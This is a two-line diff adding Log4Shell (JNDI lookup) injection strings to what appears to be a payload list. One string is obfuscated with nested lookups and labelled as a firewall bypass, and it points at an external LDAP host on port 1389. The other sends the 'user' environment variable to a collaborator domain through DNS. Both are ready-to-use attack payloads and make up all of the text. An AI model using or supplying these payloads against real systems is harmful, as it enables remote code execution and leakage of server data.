@@ -1,0 +1,2 @@
+${j${k8s:k5:-ND}i${sd:k5:-:}ldap://mydogsbutt.com:1389/o} - AWS Firewall Bypass
+${jndi:ldap://${env:user}.xyz.collab.com/a} - Default Payload 
